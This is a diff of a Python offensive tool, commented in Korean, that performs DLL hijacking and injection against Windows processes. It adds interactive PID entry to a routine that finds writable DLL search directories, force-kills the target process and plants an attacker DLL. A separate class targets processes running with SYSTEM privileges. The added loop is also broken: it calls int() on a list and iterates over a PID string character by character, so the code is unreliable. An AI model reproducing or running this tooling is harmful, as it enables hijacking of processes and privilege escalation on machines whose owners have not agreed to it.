@@ -7,6 +7,17 @@ import shutil
 class hiJacking():
     def hiJacking(self):
         pass
+    def in_PID(self):
+        pid = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n     2개 이상 -> m pid pid ...\n입력할 명령어:')
+        pid_arr = pid.split(' ')
+        if pid[0] == 'o':
+            pid = pid_arr[1]
+        else:
+            pid = []
+            for i in range(1, len(pid_arr)):
+                pid.append(pid_arr[i])
+                
+        return pid
     #Listdlls.exe 파일을 이용하여 입력된 pid에서 로드하는 dll 목록을 가져옴
     def list_dll(self,pid):
         stream = os.popen("Listdlls.exe " + str(pid))
@@ -90,22 +101,36 @@ class hiJacking():
     def attack(self):
         path_exe = "C:/Users/codeb/Desktop/ExamDLL/CreateDLL/x64/Debug/MainDLL.exe"
         path_dll = "C:/Users/codeb/Desktop/CreateDLL.dll"
-        pid = self.create_process(path_exe)
-        program_name, list_dlls = self.list_dll(pid)
-        file_list,dir_list = self.check_permission(list_dlls)
-        if not len(file_list) == 0:
-            if self.find_string(program_name,file_list,dir_list):
-                print("Detect programs vulnerable to dll injection")
-                print("Vulnerable PID : " + str(pid))
-                os.system('taskkill /f /pid '+str(pid))
-                self.change_dll(path_dll,dir_list,pid)
+        # pid = self.create_process(path_exe)
+        pid = self.in_PID()
+        for i in range(0,len(pid)):
+            print(f'{len(pid)}개의 pid 중 {i}번째 pid로의 hiJacking!')
+            program_name, list_dlls = self.list_dll(int(pid))
+            file_list,dir_list = self.check_permission(list_dlls)
+            if not len(file_list) == 0:
+                if self.find_string(program_name,file_list,dir_list):
+                    print("Detect programs vulnerable to dll injection")
+                    print("Vulnerable PID : " + pid)
+                    os.system('taskkill /f /pid '+pid)
+                    self.change_dll(path_dll,dir_list,int(pid))
+                else:
+                    print("Nah....")
             else:
-                print("Nah....")
-        else:
-            print("Not Found writable dir")
+                print("Not Found writable dir")
 class injection():
     def injection(self):
         pass
+    def in_PID(self):
+        pid = input('pid 1개 입력 시 맨 앞에 \'o\', 2개 이상 입력 시 \'m\' 명령어를 입력해주세요.\n예시> 1개 -> o pid\n     2개 이상 -> m pid pid ...\n입력할 명령어:')
+        pid_arr = pid.split(' ')
+        if pid[0] == 'o':
+            pid = pid_arr[1]
+        else:
+            pid = []
+            for i in range(1, len(pid_arr)):
+                pid.append(pid_arr[i])
+                
+        return pid
     #SYSTEM 권한으로 실행되는 프로세스 파싱, return 값 => pid
     def find_process(self):
         proc_lists = []
